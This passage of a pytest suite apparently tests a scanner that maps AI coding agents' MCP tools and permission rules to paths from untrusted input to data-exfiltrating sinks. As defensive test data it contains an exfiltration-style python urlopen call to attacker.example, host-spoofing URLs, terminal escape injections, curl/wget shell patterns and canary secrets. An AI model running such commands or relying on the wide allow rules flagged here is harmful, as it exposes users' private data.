    assert "now labelled private_data, external_sink (label source: user)" in capsys.readouterr().out
    for bad in (["set", "mcp__github__get_me", "external_sink=maybe"], ["set", "mcp__github__get_me", "colour=blue"],
                ["set", "mcp__github__get_me", "sink_scope=everywhere"], ["set", "mcp__github__get_me"], ["set"],
                ["reset", "mcp__nowhere__nothing"], ["list", "stray-argument"]):
        assert tools_cli(cfg, *bad) == 2, bad
    assert "tainttrail tools" in capsys.readouterr().err

    assert tools_cli(cfg, "list", "--server", "github", "--capability", "external_sink", "--json") == 0
    rows = json.loads(capsys.readouterr().out)
    assert rows and all(r["server"] == "github" and r["external_sink"] for r in rows)
    me = next(r for r in rows if r["name"] == "mcp__github__get_me")
    assert (me["label_source"], me["label_confidence"], me["sink_scope"]) == ("user", 1.0, "public")

    scan_cli(cfg, home, project, "--json")      # a later scan keeps the user's label
    with Store(cfg.db_path) as store:
        assert tool(store, "mcp__github__get_me")["label_source"] == "user"
        assert Recorder(store, cfg).tool_labels("claude-code", "mcp__github__get_me").external_sink is True
    capsys.readouterr()

    assert tools_cli(cfg, "--server", "github") == 0
    table = capsys.readouterr().out
    assert "U untrusted input" in table and "mcp__github__get_me" in table and "user 1.0" in table

    assert tools_cli(cfg, "reset", "mcp__github__get_me") == 0
    assert tools_cli(cfg, "set", "mcp__reports__upload_report", "external_sink=true", "notes=uploads to a public bucket") == 0
    assert "was not in the graph and has been added" in capsys.readouterr().out
    with Store(cfg.db_path) as store:
        assert tool(store, "mcp__github__get_me")["label_source"] == "catalog"
        assert not tool(store, "mcp__github__get_me")["external_sink"]
        added = tool(store, "mcp__reports__upload_report")
        assert (added["external_sink"], added["label_source"], added["server"], added["notes"]) == \
            (True, "user", "reports", "uploads to a public bucket")


def test_tools_set_asks_which_agent_when_a_name_exists_twice(dirs):
    home, project = dirs
    entry = {"mcpServers": {"fetch": {"command": "uvx", "args": ["mcp-server-fetch"]}}}
    write(project / ".mcp.json", entry)
    write(project / ".cursor" / "mcp.json", entry)
    with Store(":memory:") as store:
        do_scan(store, home, project)
        with pytest.raises(ValueError, match="several agents"):
            scan.set_tool_labels(store, "mcp__fetch__fetch", {"private_data": True})
        changed = scan.set_tool_labels(store, "mcp__fetch__fetch", {"private_data": True}, agent="cursor")
        assert changed["id"] == "cursor::mcp__fetch__fetch"
        assert tool(store, "mcp__fetch__fetch", "cursor")["private_data"] is True
        assert tool(store, "mcp__fetch__fetch", "claude-code")["private_data"] is False


# -- asking a server for its tools ----------------------------------------------------------------------

FAKE_SERVER = textwrap.dedent('''
    import json, os, sys
    open(os.environ["MARK"], "w").write(str(os.getpid()))
    for line in sys.stdin:
        msg = json.loads(line)
        if msg.get("method") == "initialize":
            print("starting up (a log line on stdout, not JSON)", flush=True)
            print(json.dumps({"jsonrpc": "2.0", "id": msg["id"], "result": {"protocolVersion": "2025-06-18",
                  "capabilities": {"tools": {}}, "serverInfo": {"name": "fake", "version": "1"}}}), flush=True)
        elif msg.get("method") == "tools/list":
            first = not msg.get("params", {}).get("cursor")
            tools = ([{"name": "send_report", "description": "Send a report by e-mail to any address",
                       "inputSchema": {"type": "object", "properties": {"to": {}, "body": {}}}},
                      {"name": "get_weather", "description": "Weather for a city"}] if first else
                     [{"name": "read_inbox", "description": "Read the messages in the inbox"}, "not a tool"])
            result = {"tools": tools, **({"nextCursor": "page2"} if first else {})}
            print(json.dumps({"jsonrpc": "2.0", "id": msg["id"], "result": result}), flush=True)
''')


def fake_server(tmp_path: Path, project: Path, body: str = FAKE_SERVER) -> Path:
    script = write(tmp_path / "fake_mcp.py", text=body)
    write(project / ".mcp.json", {"mcpServers": {"reports": {
        "command": sys.executable, "args": [str(script)], "env": {"MARK": "${MARK_DIR:-" + str(tmp_path) + "}/started"}}}})
    return tmp_path / "started"


def test_introspection_asks_the_server_and_a_later_plain_scan_keeps_the_answer(dirs, tmp_path):
    home, project = dirs
    marker = fake_server(tmp_path, project)
    [config] = scan.discover(home, project, agents=["claude-code"])
    [entry] = scan.introspection_targets([config])
    listed = scan.introspect_server(entry, timeout=30, environ={"PATH": "/usr/bin:/bin"})
    assert [t["name"] for t in listed] == ["send_report", "get_weather", "read_inbox"], "both pages, junk dropped"
    assert marker.exists()
    with Store(":memory:") as store:
        do_scan(store, home, project, introspected={entry.id: listed})
        send = tool(store, "mcp__reports__send_report")
        assert send["external_sink"] and (send["label_source"], send["origin"]) == ("introspect", "introspect")
        assert send["description"] == "Send a report by e-mail to any address"
        assert tool(store, "mcp__reports__read_inbox")["untrusted_input"]
        assert tool(store, "mcp__reports__get_weather")["label_confidence"] == 0.3
        scan.set_tool_labels(store, "mcp__reports__get_weather", {"untrusted_input": True})

        do_scan(store, home, project)       # no --introspect this time
        assert tools_of(store, "claude-code/reports") == {
            "mcp__reports__send_report", "mcp__reports__get_weather", "mcp__reports__read_inbox"}
        assert "earlier `tainttrail scan --introspect`" in servers(store)["reports"]["notes"]
        assert tool(store, "mcp__reports__send_report")["label_source"] == "introspect"

        # Asking again replaces what the first answer led to, but not what a person set.
        do_scan(store, home, project, introspected={entry.id: [{"name": "get_weather"}, {"name": "send_report"}]})
        assert tools_of(store, "claude-code/reports") == {"mcp__reports__send_report", "mcp__reports__get_weather"}
        assert tool(store, "mcp__reports__get_weather")["label_source"] == "user"
        assert store.scalar("MATCH (t:Tool {id: 'claude-code::mcp__reports__read_inbox'}) RETURN count(t)") == 0


def test_introspect_needs_yes_and_starts_nothing_without_it(dirs, cfg, tmp_path, capsys):
    home, project = dirs
    marker = fake_server(tmp_path, project)
    assert scan_cli(cfg, home, project, "--introspect") == 2
    err = capsys.readouterr().err
    assert "would start these commands" in err and "fake_mcp.py" in err and "Nothing was started" in err
    assert not marker.exists() and not cfg.db_path.exists()
    assert scan_cli(cfg, home, project, "--introspect", "--yes", "--timeout", "30", "--json") == 0
    captured = capsys.readouterr()
    assert marker.exists() and "starting claude-code/reports" in captured.err
    report = json.loads(captured.out)
    assert any("the server listed 3 tools" in w for w in report["warnings"])
    assert report["agents"][0]["servers"][1]["tools"] == 3


@pytest.mark.parametrize("body,message", [
    ("import os, time\nopen(os.environ['MARK'], 'w').write(str(os.getpid()))\ntime.sleep(60)\n", "no answer within"),
    ("import os\nopen(os.environ['MARK'], 'w').write(str(os.getpid()))\n", "exited before answering"),
    ("import json, os, sys\nopen(os.environ['MARK'], 'w').write(str(os.getpid()))\nsys.stdin.readline()\n"
     "print(json.dumps({'jsonrpc': '2.0', 'id': 1, 'error': {'code': -1, 'message': 'no'}}), flush=True)\n"
     "import time; time.sleep(60)\n", "answered with an error"),
])
def test_a_server_that_hangs_dies_or_refuses_is_reported_and_stopped(dirs, tmp_path, body, message):
    import os
    import time

    home, project = dirs
    marker = fake_server(tmp_path, project, body)
    [config] = scan.discover(home, project, agents=["claude-code"])
    [entry] = scan.introspection_targets([config])
    started = time.monotonic()
    with pytest.raises(scan.IntrospectError, match=message):
        scan.introspect_server(entry, timeout=5)
    assert time.monotonic() - started < 30
    pid = int(marker.read_text())
    with pytest.raises(ProcessLookupError):
        os.kill(pid, 0)                     # the process we started is gone


def test_introspection_refuses_what_it_cannot_start(dirs):
    with pytest.raises(scan.IntrospectError, match="could not start"):
        scan.introspect_server(ServerEntry("claude-code", "x", "project", "f", argv=["/nonexistent/binary-for-test"]))
    with pytest.raises(scan.IntrospectError, match="only local"):
        scan.introspect_server(ServerEntry("claude-code", "x", "project", "f", transport="http", url="https://x.test/mcp"))


# -- text from files is never trusted with the terminal ----------------------------------------------------


def test_control_characters_from_a_cloned_repository_cannot_repaint_the_report(dirs):
    home, project = dirs
    write(project / ".mcp.json", {"mcpServers": {
        "evil\x1b[2K\rAll clear": {"command": "node", "args": ["x.js\x1b]0;title\x07", "--flag\nNEXT LINE"]},
        "fetch": {"command": "uvx", "args": ["mcp-server-fetch"]},
    }})
    write(project / ".claude" / "settings.json", settings(allow=["mcp__fetch__fetch\x1b[31m", "Bash(echo \x1b[0m:*)"]))
    with Store(":memory:") as store:
        result = do_scan(store, home, project)
        for text in (scan.render_scan(result, None), scan.render_tools(scan.list_tools(store)), graph_text(store)):
            assert "\x1b" not in text and "\x07" not in text and "\r" not in text
        assert "evil?[2K?All clear" in servers(store)
        assert "--flag?NEXT LINE" in servers(store)["evil?[2K?All clear"]["command"], "a line break stays visible"


def test_a_server_cannot_smuggle_odd_tool_names_through_introspection(dirs):
    home, project = dirs
    write(project / ".mcp.json", {"mcpServers": {"reports": {"command": "node", "args": ["x.js"]}}})
    listed = [{"name": "ok_tool", "description": "Reads the inbox\x1b[2K and e-mails " + GH_TOKEN},
              {"name": "bad name\x1b[31m"}, {"name": ""}, {"name": "x" * 500}, {"name": 7}, {"description": "nameless"}]
    with Store(":memory:") as store:
        do_scan(store, home, project, introspected={"claude-code/reports": listed})
        assert tools_of(store, "claude-code/reports") == {"mcp__reports__ok_tool"}
        description = tool(store, "mcp__reports__ok_tool")["description"]
        assert "\x1b" not in description and GH_TOKEN not in description and description.startswith("Reads the inbox")
        with pytest.raises(ValueError, match="does not look like a tool name"):
            scan.set_tool_labels(store, "new tool\x1b[0m", {"external_sink": True})


@pytest.mark.parametrize("blocker,allowed,covered", [
    ("curl:*", "curl:*", True), ("curl *", "curl:*", True), ("curl:*", "curl -s:*", True), ("*", "curl:*", True),
    ("curl", "curl", True), ("curl", "curl:*", False), ("curl:*", "curlx:*", False), ("curl -s:*", "curl:*", False),
    ("git push:*", "git:*", False), ("git:*", "git push:*", True),
])
def test_an_ask_or_deny_pattern_covers_an_allow_pattern_only_when_it_is_at_least_as_wide(blocker, allowed, covered):
    assert scan.pattern_covers(blocker, allowed) is covered


def test_an_ask_rule_on_the_same_pattern_closes_what_the_allow_rule_opened(dirs):
    home, project = dirs
    for ask, gate in (([], "open"), (["Bash(curl:*)"], "ask"), (["Bash(curl -s:*)"], "open"), (["Bash(wget:*)"], "open")):
        claude_github(home, project, allow=["Bash(curl:*)"], ask=ask)
        with Store(":memory:") as store:
            do_scan(store, home, project)
            assert tool(store, "Bash")["gate"] == gate, ask
    claude_github(home, project, allow=["Bash(curl:*)", "Bash(wget:*)"], deny=["Bash(curl:*)"])
    with Store(":memory:") as store:
        do_scan(store, home, project)
        bash = tool(store, "Bash")
        assert (bash["gate"], bash["open_partial"]) == ("open", ["Bash(wget:*)"]), "wget is still allowed unasked"


def test_a_discovery_that_fails_outright_keeps_the_previous_scan(dirs, monkeypatch):
    home, project = dirs
    claude_trio(home, project)
    with Store(":memory:") as store:
        do_scan(store, home, project)
        before = graph_text(store)

        def explode(*args, **kwargs):
            raise KeyError("unexpected shape")

        monkeypatch.setitem(scan._DISCOVERERS, "claude-code", explode)
        result = do_scan(store, home, project)
        assert graph_text(store) == before, "an agent we could not read is not replaced by an empty one"
        assert result.problems == ["Claude Code: its configuration could not be read (KeyError)"]
        assert "claude-code" not in [a["kind"] for a in result.agents]


# -- hostile sizes --------------------------------------------------------------------------------------------


def test_rules_written_to_stall_the_matcher_do_not():
    import time

    spec = ToolSpec("claude-code", "mcp__x__" + "a" * 300, "x", "a" * 300, "x")
    hostile = rules(allow=["mcp__x__" + "a*" * 80 + "b"], deny=[" " * 500_000 + "Bash", "Bash(" + "(" * 50_000,
                                                                  "mcp__x__" + "*" * 5000 + "z"])
    started = time.monotonic()
    assert scan.evaluate_permission(spec, hostile).permission == "default"
    assert time.monotonic() - started < 2
    assert scan.evaluate_permission(spec, rules(deny=["mcp__x__a*a"])).permission == "deny"


def test_oversized_files_are_reported_instead_of_parsed(dirs, monkeypatch):
    home, project = dirs
    monkeypatch.setattr(scan, "MAX_CONFIG_BYTES", 2000)
    monkeypatch.setattr(scan, "MAX_LENIENT_BYTES", 300)
    write(project / ".mcp.json", {"mcpServers": {f"s{i}": {"command": "node", "args": ["x.js"]} for i in range(80)}})
    write(project / ".vscode" / "mcp.json", text='{"servers": {"a": {"type": "stdio", "command": "node"}} /* ' + "x" * 400 + " */}")
    write(home / ".codex" / "config.toml", text="# " + "x" * 400 + '\n[mcp_servers.a]\ncommand = "node"\n')
    with Store(":memory:") as store:
        result = do_scan(store, home, project)
        problems = sorted(p.replace(str(home), "~") for p in result.problems)
        assert len(problems) == 3, problems
        assert problems[0].startswith("~/.codex/config.toml: larger than") and problems[0].endswith("not read")
        assert problems[1].startswith("~/work/app/.mcp.json: larger than")
        assert problems[2].startswith("~/work/app/.vscode/mcp.json: not valid JSON"), "too big to strip comments from"
        assert set(servers(store)) == {"builtin"} and set(servers(store, "codex")) == {"builtin"}


def test_labels_a_model_set_survive_a_rescan_and_account_data_is_never_copied(dirs):
    home, project = dirs
    claude_github(home, project)
    with Store(":memory:") as store:
        do_scan(store, home, project)
        # What llm.label_tools_with_llm would write for a tool the tables only guess about.
        store.write("MATCH (t:Tool {id: 'claude-code::mcp__github__list_discussions'}) "
                    "SET t.label_source = 'llm', t.label_confidence = 0.8, t.external_sink = true, t.notes = 'model says so'")
        do_scan(store, home, project)
        kept = tool(store, "mcp__github__list_discussions")
        assert (kept["label_source"], kept["label_confidence"], kept["external_sink"], kept["notes"]) == \
            ("llm", 0.8, True, "model says so")
        assert store.scalar("MATCH (:Tool {id: 'claude-code::mcp__github__list_discussions'})-[:HAS_CAPABILITY]->"
                            "(:Capability {name: 'external_sink'}) RETURN count(*)") == 1
        # ~/.claude.json also holds account details; only the server and project keys are read.
        text = graph_text(store)
        assert "someone@example.test" not in text and "oauthAccount" not in text and "numStartups" not in text


# -- review: ways past the scan, and false alarms ---------------------------------------------------------------
# Each test below failed before the change it describes. Hosts and secrets are the reserved
# test ones (attacker.example, *.test, canary-...).


@pytest.mark.parametrize("pattern,sends", [
    # The text before the first wildcard is what limits a rule; anything may follow it.
    ("git:*", True), ("git *", True), ("gh:*", True), ("gh api:*", True), ("gh issue:*", True), ("npm:*", True),
    ("pnpm:*", True), ("aws:*", True), ("aws s3:*", True), ("gsutil:*", True), ("twine:*", True), ("openssl:*", True),
    ("git -C:*", True), ("git -c:*", True), ("uv:*", True), ("uv run:*", True), ("uv run python:*", True),
    ("psql:*", True), ("docker:*", True), ("sudo:*", True), ("env:*", True), ("FOO=bar curl:*", True),
    # A wildcard in the middle or glued to a word matches more than it looks like.
    ("git * main", True), ("git p*", True), ("cu*", True), ("c*", True), ("py*", True), ("* --version", True),
    ("curl https://api.internal.test/*", True),
    # Rules that cannot send, and must not raise an alarm.
    ("git status:*", False), ("git log * main", False), ("git st*", False), ("gh pr view:*", False),
    ("gh issue list:*", False), ("aws s3 ls:*", False), ("npm run *", False), ("npm run * --silent", False),
    ("uv run pytest:*", False), ("uv pip install:*", False), ("find:*", False), ("ls*", False), ("ls *", False),
    ("echo *", False), ("make:*", False), ("pytest:*", False), ("go test:*", False),
    ("git:* push", False),          # ":*" is only a wildcard at the very end
    ("python --version", False), ("node -v", False), ("env", False), ("git", False),
    # Interpreters and launchers: open arguments allow anything, fixed ones allow what they name.
    ("python:*", True), ("python -c:*", True), ("node -e:*", True), ("bash -c *", True), ("npx:*", True),
    ("sudo:*", True), ("xargs:*", True), ("timeout:*", True), ("docker run:*", True), ("deno run:*", True),
    ("env FOO=1 node:*", True), ("timeout 30 curl:*", True), ("sudo -u postgres psql:*", True),
    ("xargs -n1 curl:*", True), ("poetry run python:*", True), ('bash -c "npm test && *"', True),
    ("python -c \"import urllib.request; urllib.request.urlopen('https://attacker.example/x')\"", True),
    ("npx tsc:*", False), ("npx prettier --check:*", False), ("python -m pytest:*", False), ("python manage.py:*", False),
    ("node scripts/build.js:*", False), ("bash scripts/release.sh:*", False), ("python deploy.py", False),
    ("sudo apt-get:*", False), ("timeout 30 npm test:*", False), ("xargs grep:*", False), ("docker ps:*", False),
    ("docker compose up:*", False), ("bun test:*", False), ("deno test:*", False), ('python -c "print(1)"', False),
    # A wildcard inside a quoted argument: the usual way to allow any commit message. No alarm.
    ('git commit -m "*"', False), ("git commit -m '*'", False), ('git commit -m "fix: *"', False), ('echo "*"', False),
    ('npm run "*"', False), ("grep -r '*' .", False), ('jq ".[] | *"', False), ('git log --format="%H *"', False),
    # ... but quotes are no hiding place either.
    ('git "p*"', True), ('"cu*"', True), ('bash -c "curl *"', True), ('sh -c "*"', True),
    ('curl "https://api.internal.test/v1/*"', True), ('git "st*"', False),
])
def test_what_an_allowed_command_pattern_really_lets_through(pattern, sends):
    assert scan.shell_pattern_sends(pattern) is sends


def test_claude_code_never_approves_some_wrappers_by_prefix_but_other_agents_have_no_such_rule():
    for wrapper in ("watch:*", "setsid:*", "flock:*", "ionice:*"):
        assert scan.shell_pattern_sends(wrapper) is False, wrapper
        assert scan.shell_pattern_sends(wrapper, agent="cursor") is True, wrapper


@pytest.mark.parametrize("allow,gate,partial", [
    (["Bash(git:*)"], "open", ["Bash(git:*)"]),             # git push to any remote
    (["Bash(gh:*)", "Bash(npm run *)"], "open", ["Bash(gh:*)"]),
    (["Bash(cu*)"], "open", ["Bash(cu*)"]),
    (["Bash(git * main)"], "open", ["Bash(git * main)"]),
    (["Bash(git status:*)", "Bash(git diff:*)", "Bash(npm run *)", "Bash(find:*)", "Bash(ls:*)"], "ask", []),
])
def test_common_allow_rules_that_open_the_shell_are_seen_and_harmless_ones_are_not(dirs, allow, gate, partial):
    home, project = dirs
    claude_github(home, project, allow=allow)
    with Store(":memory:") as store:
        do_scan(store, home, project)
        bash = tool(store, "Bash")
        assert (bash["gate"], bash["open_partial"]) == (gate, partial)


def test_an_ask_rule_still_closes_a_wide_allow_pattern(dirs):
    home, project = dirs
    claude_github(home, project, allow=["Bash(git:*)"], ask=["Bash(git push:*)"])
    with Store(":memory:") as store:
        do_scan(store, home, project)
        assert tool(store, "Bash")["gate"] == "open", "git:* allows more than git push (git -c ..., send-email)"
    claude_github(home, project, allow=["Bash(git:*)"], ask=["Bash(git:*)"])
    with Store(":memory:") as store:
        do_scan(store, home, project)
        assert tool(store, "Bash")["gate"] == "ask"


def test_cursor_and_gemini_command_patterns_are_prefixes(dirs):
    home, project = dirs
    write(project / ".cursor" / "mcp.json", {"mcpServers": {"fetch": {"command": "uvx", "args": ["mcp-server-fetch"]}}})
    write(project / ".gemini" / "settings.json", {"tools": {"allowed": ["run_shell_command(git)"]}})
    for allow, deny, gate in ((["Shell(git)"], [], "open"), (["Shell(ls)", "Shell(grep)"], [], "ask"),
                              (["Shell(git)"], ["Shell(git)"], "ask"), (["Shell(curl)"], ["Shell(rm)"], "open")):
        write(project / ".cursor" / "cli.json", {"permissions": {"allow": allow, "deny": deny}})
        with Store(":memory:") as store:
            do_scan(store, home, project)
            shell = tool(store, "Shell", "cursor")
            assert shell["gate"] == gate, (allow, deny)
            if gate == "open":
                assert shell["open_partial"] == [allow[0]], "the rule is kept as it is written"
            assert tool(store, "run_shell_command", "gemini-cli")["gate"] == "open", "git <anything>, push included"


def test_dont_ask_mode_does_not_hide_what_allow_rules_pre_approve(dirs):
    """dontAsk refuses what would prompt. What a rule pre-approves, and read-only commands, still run."""
    home, project = dirs
    claude_github(home, project, allow=["Bash(curl:*)", "mcp__github__issue_read", "WebFetch(domain:docs.example.test)"])
    write(home / ".claude" / "settings.json", settings(mode="dontAsk"))
    with Store(":memory:") as store:
        do_scan(store, home, project)
        bash = tool(store, "Bash")
        assert (bash["gate"], bash["open_partial"]) == ("open", ["Bash(curl:*)"]), "curl runs unasked in dontAsk mode"
        assert tool(store, "mcp__github__issue_read")["gate"] == "open"
        assert tool(store, "mcp__github__create_issue")["gate"] == "deny", "no rule approves it: refused"
        fetch = tool(store, "WebFetch")
        assert fetch["gate"] == "ask" and "pre-approves" in fetch["gate_reason"], "one domain is still fetched"
    # Without a sending pattern the shell cannot send, but its read-only commands keep it a way to read files.
    claude_github(home, project, allow=["mcp__github__issue_read", "mcp__github__create_issue"], deny=["Read"])
    with Store(":memory:") as store:
        from tainttrail import paths

        do_scan(store, home, project)
        bash = tool(store, "Bash")
        assert (bash["gate"], bash["gate_data"]) == ("ask", "open") and "read-only commands still run" in bash["gate_reason"]
        report = paths.find_paths(store, limit=5000)
        assert any(p.data == "Bash" and p.sink == "mcp__github__create_issue" and p.status == "open" for p in report.paths)


@pytest.mark.parametrize("deny,denied,rule", [
    (["mcp__*(nonsense:true)"], False, ""),         # Claude Code skips an mcp__ rule that has parentheses
    (["mcp__github(x:y)"], False, ""),
    (["mcp__github__create_issue(title:x)"], False, ""),
    (["mcp__*"], True, "mcp__*"),
    (["mcp__git*"], True, "mcp__git*"),             # deny and ask take a glob over the whole tool name
    (["mcp__*__create_*"], True, "mcp__*__create_*"),
    (["*issue"], True, "*issue"),
    (["mcp__gitlab*"], False, ""),
])
def test_deny_rules_that_look_like_they_cover_everything(dirs, deny, denied, rule):
    home, project = dirs
    claude_github(home, project, allow=["mcp__github"], deny=deny)
    with Store(":memory:") as store:
        result = do_scan(store, home, project)
        create = tool(store, "mcp__github__create_issue")
        assert (create["permission"] == "deny", create["permission_rule"] if denied else "") == (denied, rule)
        assert create["permission_partial"] == [], "a rule that is skipped is not listed as if it did something"
        if "(" in deny[0]:
            notes = " ".join(result.agents[0]["notes"])
            assert "skips an mcp__ rule that has parentheses" in notes and deny[0] in notes


def test_tool_name_globs_work_for_deny_and_ask_and_approve_nothing_under_allow():
    web = [ToolSpec("claude-code", n) for n in ("WebFetch", "WebSearch", "Write")]
    assert [scan.evaluate_permission(t, rules(deny=["Web*"])).permission for t in web] == ["deny", "deny", "default"]
    assert [scan.evaluate_permission(t, rules(ask=["W*"])).permission for t in web] == ["ask", "ask", "ask"]
    assert [scan.evaluate_permission(t, rules(allow=["W*", "*", "Web*"])).permission for t in web] == ["default"] * 3
    assert scan.evaluate_permission(GH_GET, rules(allow=["mcp__git*__get_issue", "mcp__*__get_issue"])).permission == "default"
    background = scan.evaluate_permission(BASH, rules(deny=["B*(run_in_background:true)"]))
    assert (background.permission, background.partial) == ("default", ["deny B*(run_in_background:true)"])


def test_a_bare_read_deny_removes_read_but_is_only_best_effort_for_the_other_reading_tools(dirs):
    assert scan.evaluate_permission(READ, rules(deny=["Read"])).permission == "deny"
    grep = scan.evaluate_permission(GREP, rules(deny=["Read"]))
    assert (grep.permission, grep.partial) == ("default", ["deny Read"])
    assert scan.evaluate_permission(GREP, rules(deny=["Grep"])).permission == "deny"
    assert scan.evaluate_permission(WRITE, rules(deny=["Edit"])).permission == "deny", "Edit rules do cover every edit tool"
    home, project = dirs
    claude_github(home, project, deny=["Read", "Bash"])
    with Store(":memory:") as store:
        do_scan(store, home, project)
        assert (tool(store, "Read")["gate"], tool(store, "Grep")["gate"]) == ("deny", "open"), "Grep still prints file contents"


@pytest.mark.parametrize("args,env,read_only", [
    (["--read-only"], {}, True), (["--read-only=true"], {}, True), ([], {"GITHUB_READ_ONLY": "1"}, True),
    (["--read-only=false"], {}, False), (["--read-only=0"], {}, False), ([], {"GITHUB_READ_ONLY": "false"}, False),
    ([], {"GITHUB_READ_ONLY": "${READ_ONLY}"}, False),          # the file does not say: do not assume the safe case
    ([], {"GITHUB_READ_ONLY": "$READ_ONLY"}, False),
])
def test_read_only_mode_is_believed_only_when_it_is_switched_on(dirs, args, env, read_only):
    home, project = dirs
    write(project / ".mcp.json", {"mcpServers": {"github": {
        "command": "docker", "args": ["run", "-i", "ghcr.io/github/github-mcp-server", *args], "env": env}}})
    with Store(":memory:") as store:
        do_scan(store, home, project)
        assert (tool(store, "mcp__github__create_issue") is None) is read_only
        assert bool(servers(store)["github"]["risk_reducing"]) is read_only


def test_a_risk_flag_whose_value_is_not_in_the_file_still_counts(dirs):
    home, project = dirs
    write(project / ".mcp.json", {"mcpServers": {"aws": {
        "command": "uvx", "args": ["awslabs.aws-api-mcp-server"],
        "env": {"AWS_API_MCP_ALLOW_UNRESTRICTED_LOCAL_FILE_ACCESS": "${UNRESTRICTED}", "READ_OPERATIONS_ONLY": "${RO}"}}}})
    with Store(":memory:") as store:
        do_scan(store, home, project)
        server = servers(store)["aws"]
        assert server["risk_flags"] == ["AWS_API_MCP_ALLOW_UNRESTRICTED_LOCAL_FILE_ACCESS"] and server["risk_reducing"] == []


def test_a_setting_in_a_url_is_read_by_name_and_value(dirs):
    entry = lambda url: ServerEntry("claude-code", "supabase", "project", "f", transport="http", url=url)  # noqa: E731
    flags = ["read_only=true", "project_ref=", "/readonly"]
    found = lambda url: scan._config_flags(entry(url), flags, when_unknown=False)  # noqa: E731
    assert found("https://mcp.supabase.test/mcp?read_only=true&project_ref=abc") == ["read_only=true", "project_ref="]
    assert found("https://mcp.supabase.test/mcp?read_only=false&project_ref=") == []
    assert found("https://mcp.supabase.test/mcp?note=read_only=true") == []
    assert found("https://api.example.test/mcp/readonly") == ["/readonly"]
    assert found("https://api.example.test/mcp?next=/readonly") == []


# -- review: hosts ------------------------------------------------------------------------------------------------


@pytest.mark.parametrize("url,host", [
    ("https://attacker.example\\@api.githubcopilot.com/mcp/", "attacker.example"),      # a backslash ends the host
    ("https://attacker.example\\.api.githubcopilot.com/mcp/", "attacker.example"),
    ("https://api.githubcopilot.com@attacker.example/mcp/", "attacker.example"),
    ("https://api.githubcopilot.com.attacker.example/mcp/", "api.githubcopilot.com.attacker.example"),
    ("https://attacker.example/#@api.githubcopilot.com/", "attacker.example"),
    ("https://attacker.example/?x=@api.githubcopilot.com/", "attacker.example"),
    ("HTTPS://API.GITHUBCOPILOT.COM./mcp/", "api.githubcopilot.com"),
])
def test_the_host_a_scan_names_is_the_host_the_agent_reaches(dirs, url, host):
    assert scan.url_host(url) == host
    entry = ServerEntry("claude-code", "remote", "project", "f", transport="http", url=url)
    found, how = scan.identify_server(entry, classify.load_catalog())
    assert ((found or {}).get("id"), how) == (("github", "host") if host == "api.githubcopilot.com" else (None, ""))
    home, project = dirs
    write(project / ".mcp.json", {"mcpServers": {"remote": {"type": "http", "url": url}}})
    with Store(":memory:") as store:
        do_scan(store, home, project)
        stored = servers(store)["remote"]
        assert stored["url_host"] == host and host in stored["url"].lower(), "the real host is shown, not hidden as a credential"


def test_a_wrapped_remote_server_is_found_whatever_the_case_of_its_scheme():
    entry = ServerEntry("claude-code", "tickets", "project", "f", argv=["npx", "-y", "mcp-remote", "HTTPS://mcp.linear.app/sse"])
    assert scan.identify_server(entry, classify.load_catalog())[1] == "host"


# -- review: redaction --------------------------------------------------------------------------------------------


@pytest.mark.parametrize("url,expected", [
    ("//admin:canary-pg-password-0004@db.internal.test/x", "//«redacted»@db.internal.test/x"),
    ("admin:canary-pg-password-0004@db.internal.test:5432/prod", "«redacted»@db.internal.test:5432/prod"),
    ("localhost:3000/mcp?token=canary-url-query-0003", "localhost:3000/mcp?token=«redacted»"),
    ("https://x.test/mcp?canary-url-query-0003", "https://x.test/mcp?«redacted»"),            # a query with no name
    ("https://x.test/mcp?abcdefghijklmnopqrstuvwx&debug", "https://x.test/mcp?«redacted»&debug"),
    ("https://x.test/t/canary%2Durl%2Dquery%2D0003/sse", "https://x.test/t/«redacted»/sse"),   # %-escaped
    ("https://x.test/cb?t%6Fken=abc", "https://x.test/cb?t%6Fken=«redacted»"),
    ("https://x.test/mcp#access_token=canary-url-query-0003", "https://x.test/mcp"),
    ("/mcp?x=1", "/mcp?x=1"),
])
def test_urls_written_in_unusual_ways_lose_their_credentials_too(url, expected):
    assert scan.redact_url(url) == expected
    assert scan.redact_url(expected) == expected
    for canary in CANARIES.values():
        assert canary not in scan.scrub(scan.redact_url(url))


@pytest.mark.parametrize("argv,hidden,kept", [
    (["psql", "PGPASSWORD=hunter2"], "hunter2", "psql PGPASSWORD=«»"),
    (["server", "--pass", "hunter2"], "hunter2", "server --pass «»"),
    (["server", "--pass=hunter2"], "hunter2", "server --pass=«»"),
    (["server", "--db-passwd", "hunter2"], "hunter2", "--db-passwd «»"),
    (["server", "AUTHTOKEN=abc123"], "abc123", "AUTHTOKEN=«»"),
    (["server", "--connection-string", "Server=x;User=sa;Password=hunter2;"], "hunter2", "Server=x;User=sa;Password=«»;"),
    (["sh", "-c", "export DB_PASS='p w'; exec server"], "p w", "exec server"),
    (["server", "--config", '{"password": "hunter2", "port": 5432}'], "hunter2", '"port": 5432'),
    (["server", "-H", "Authorization: Token abc123def"], "abc123def", "Authorization: Token «»"),
    (["server", "-H", "Authorization: abc123def"], "abc123def", "Authorization: «»"),
])
def test_short_passwords_and_one_word_names_are_redacted(argv, hidden, kept):
    import re

    line = scan.redact_argv(argv)
    assert hidden not in line
    assert kept in re.sub(r"«[a-z_]+»", "«»", line), line      # whichever detector saw it, its kind is all that is left
    assert scan.scrub(line) == line


def test_names_that_say_secret_in_one_word():
    for name in ("PGPASSWORD", "DB_PASS", "AUTHTOKEN", "apiToken", "MYSQL_PWD", "CLIENTSECRET", "AWS_SECRET_ACCESS_KEY",
                 "accessKey", "ACCESSKEY", "--pass", "X-Api-Tokens", "GITHUB_PERSONAL_ACCESS_TOKEN", "credentials"):
        assert scan.secretish_name(name), name
    for name in ("BYPASS_PROXY", "COMPASS_URL", "PASSENGER_COUNT", "LOG_LEVEL", "MONKEY_PATCH", "TOKENIZER", "REGION",
                 "--passive", "KEYBOARD_LAYOUT", "SECRETARY", "--repository"):
        assert not scan.secretish_name(name), name


@pytest.mark.parametrize("text,value", [
    ("password=hunter2", "hunter2"), ("pwd: zq1", "zq1"), ("secret = 's3cr3t'", "s3cr3t"), ('{"api_key": "zq1"}', "zq1"),
    ("DB_PASS=x1y", "x1y"), ("Authorization: Token zq1zq1", "zq1zq1"),
])
def test_scrub_redacts_assignments_whatever_their_length_and_stays_idempotent(text, value):
    import re

    once = scan.scrub(text)
    assert value not in once and re.search(r"«[a-z_]+»", once), once
    assert scan.scrub(once) == once


@pytest.mark.parametrize("text", [
